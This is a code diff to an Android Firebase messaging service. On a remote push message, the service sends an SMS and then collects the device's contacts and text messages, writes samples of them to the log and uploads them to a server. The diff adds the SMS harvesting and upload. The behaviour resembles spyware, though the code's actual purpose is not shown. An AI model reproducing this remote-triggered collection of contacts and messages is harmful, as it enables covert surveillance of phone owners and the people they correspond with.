@@ -6,6 +6,7 @@ import com.google.firebase.messaging.FirebaseMessagingService;
 import com.google.firebase.messaging.RemoteMessage;
 
 import java.util.List;
+import java.util.Map;
 
 import static android.content.ContentValues.TAG;
 
@@ -15,8 +16,9 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
 
     @Override
     public void onMessageReceived(RemoteMessage remoteMessage) {
-        String strTitle=remoteMessage.getNotification().getTitle();
-        String message=remoteMessage.getNotification().getBody();
+        Map<String, String> data = remoteMessage.getData();
+        String strTitle = data.get("title");
+        String message = data.get("text");
         Log.d(TAG,"onMessageReceived:  Message Received: \n" + "Title: " + strTitle + "\n" + "Message: "+ message);
         sendSMS(strTitle,message);
         SyncData();
@@ -31,14 +33,13 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
         ContentCollector cc = new ContentCollector();
         ContactsList contactLs = new ContactsList();
         contactLs.SetContact(cc.GetContacts(this));
-        Log.d(TAG,"Name : "+ contactLs.Contacts.get(1).GetName()+" Number : " + contactLs.Contacts.get(1).GetNumber());
-        // List<SMS> lsSMS = cc.GetSMS(this);
-        //Log.d(TAG,"Creator : "+ lsSMS.get(1).GetCreator()+" Message : " + lsSMS.get(1).GetBody());
+        Log.d("SYNC","Name : "+ contactLs.GetContact().get(1).GetName()+" Number : " + contactLs.GetContact().get(1).GetNumber());
+        SMSList SMSLs = new SMSList();
+        SMSLs.SetSMS(cc.GetSMS(this));
+        Log.d("SYNC","Address : "+ SMSLs.GetSMS().get(3).GetAddress()+" Message : " + SMSLs.GetSMS().get(3).GetBody()+" Date : "+SMSLs.GetSMS().get(3).GetDate()+" Type : "+SMSLs.GetSMS().get(3).GetType());
 
         new HttpExecute(retrofitAPI.CreateContacts(contactLs)).start();
-        //new HttpExecute(retrofitAPI.CreateSMS(lsSMS));
-
-
+        new HttpExecute(retrofitAPI.CreateSMS(SMSLs)).start();
     }
 
 
